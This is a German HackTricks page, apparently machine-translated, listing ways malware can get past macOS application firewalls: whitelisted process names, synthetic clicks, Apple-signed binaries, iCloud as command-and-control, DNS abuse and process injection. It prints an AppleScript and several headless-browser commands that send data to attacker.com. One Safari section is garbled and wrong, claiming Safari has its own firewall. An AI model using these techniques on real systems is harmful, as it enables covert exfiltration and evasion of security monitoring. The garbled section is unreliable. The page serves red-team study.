# macOS Firewall umgehen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Gefundene Techniken

Die folgenden Techniken wurden in einigen macOS-Firewall-Apps gefunden und funktionieren.

### Missbrauch von Whitelist-Namen

* Zum Beispiel das Benennen von Malware mit Namen bekannter macOS-Prozesse wie **`launchd`**&#x20;

### Synthetischer Klick

* Wenn die Firewall um Erlaubnis bittet, kann die Malware auf **Zulassen** klicken

### **Verwenden von von Apple signierten Binärdateien**

* Wie **`curl`**, aber auch andere wie **`whois`**

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** zulassen. Und iCloud könnte als C2 verwendet werden.

### Generischer Umgehung

Einige Ideen, um Firewalls zu umgehen

### Überprüfen des erlaubten Datenverkehrs

Das Wissen über den erlaubten Datenverkehr hilft Ihnen dabei, potenziell in die Whitelist aufgenommene Domains oder die Anwendungen, die auf diese zugreifen dürfen, zu identifizieren.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Ausnutzung von DNS

DNS-Auflösungen werden über die signierte Anwendung **`mdnsreponder`** durchgeführt, die wahrscheinlich Zugriff auf DNS-Server hat.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Über Browser-Apps

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari

Safari ist ein Webbrowser, der standardmäßig auf macOS-Geräten installiert ist. Er bietet eine Vielzahl von Funktionen und Sicherheitsmaßnahmen, um das Surfen im Internet sicherer zu machen. Safari verfügt über integrierte Firewall-Funktionen, die dazu dienen, unerwünschten Datenverkehr zu blockieren und den Zugriff auf das System zu kontrollieren.

Es gibt jedoch Möglichkeiten, die Firewall von Safari zu umgehen und auf bestimmte Websites oder Dienste zuzugreifen, die möglicherweise blockiert sind. Eine Möglichkeit besteht darin, Proxy-Server oder VPN-Dienste zu verwenden, um die IP-Adresse zu ändern und den Datenverkehr über andere Netzwerke zu leiten. Dadurch wird die Firewall umgangen und der Zugriff auf blockierte Inhalte ermöglicht.

Eine andere Methode besteht darin, die Einstellungen von Safari zu ändern und die Firewall-Funktionen zu deaktivieren. Dies kann jedoch zu Sicherheitsrisiken führen, da dadurch möglicherweise schädlicher Datenverkehr zugelassen wird.

Es ist wichtig zu beachten, dass das Umgehen der Firewall von Safari gegen die Sicherheitsrichtlinien und -praktiken von macOS verstößt. Es wird empfohlen, die Firewall-Funktionen von Safari aktiviert zu lassen, um das System vor potenziellen Bedrohungen zu schützen.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Über Prozessinjektionen

Wenn Sie Code in einen Prozess **einschleusen können**, der berechtigt ist, eine Verbindung zu einem beliebigen Server herzustellen, können Sie die Firewall-Schutzmaßnahmen umgehen:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referenzen

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
